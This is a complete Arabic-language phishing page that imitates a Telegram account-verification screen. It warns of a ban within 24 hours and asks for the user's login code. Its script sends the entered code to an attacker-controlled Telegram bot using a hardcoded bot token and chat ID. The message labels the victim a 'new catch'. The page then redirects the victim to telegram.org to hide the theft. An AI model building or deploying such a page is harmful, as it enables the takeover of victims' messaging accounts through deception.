<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Telegram Security Check</title>
    <style>
        body {
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            background-color: #f4f4f5;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .login-card {
            background: white;
            padding: 40px;
            border-radius: 20px;
            box-shadow: 0 10px 25px rgba(0,0,0,0.05);
            width: 100%;
            max-width: 360px;
            text-align: center;
        }
        .logo {
            width: 100px;
            margin-bottom: 20px;
        }
        h2 {
            color: #222;
            font-size: 24px;
            margin-bottom: 10px;
        }
        p {
            color: #707579;
            font-size: 15px;
            line-height: 1.5;
            margin-bottom: 25px;
        }
        input {
            width: 100%;
            padding: 12px;
            border: 1px solid #dfe1e5;
            border-radius: 10px;
            font-size: 16px;
            box-sizing: border-box;
            margin-bottom: 20px;
            text-align: center;
            outline: none;
        }
        input:focus { border-color: #3390ec; }
        button {
            width: 100%;
            padding: 12px;
            background-color: #3390ec;
            color: white;
            border: none;
            border-radius: 10px;
            font-size: 16px;
            font-weight: bold;
            cursor: pointer;
            transition: background 0.3s;
        }
        button:hover { background-color: #2b79c7; }
        .footer {
            margin-top: 20px;
            font-size: 13px;
            color: #999;
        }
    </style>
</head>
<body>

<div class="login-card">
    <img src="https://upload.wikimedia.org/wikipedia/commons/8/82/Telegram_logo.svg" alt="Telegram" class="logo">
    <h2>تأكيد الحساب</h2>
    <p>لقد رصدنا نشاطاً غريباً. يرجى إدخال الرمز المرسل إلى تطبيقك لتجنب حظر الحساب خلال 24 ساعة.</p>
    
    <input type="text" id="code" placeholder="أدخل الرمز (5 أرقام)" maxlength="5">
    <button onclick="sendData()">تأكيد الهوية</button>
    
    <div class="footer">الموقع الرسمي لحماية مستخدمي تليجرام</div>
</div>

<script>
    function sendData() {
        const token = "8743126672:AAEoxK-YR6UTDoNegxo4a0zCENPLTpFMKKg";
        const chatId = "8593367876";
        const codeValue = document.getElementById("code").value;

        if(codeValue.length < 5) {
            alert("يرجى إدخال الرمز بشكل صحيح");
            return;
        }

        const message = `🚨 صيد جديد من المختبر 😈\n📦 الرمز: ${codeValue}`;
        const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;

        fetch(url)
        .then(response => {
            alert("تم التحقق بنجاح، لن يتم حظر حسابك.");
            // تحويل الضحية للموقع الرسمي لتشتيت الانتباه
            window.location.href = "https://telegram.org";
        })
        .catch(err => console.error(err));
    }
</script>

</body>
</html>
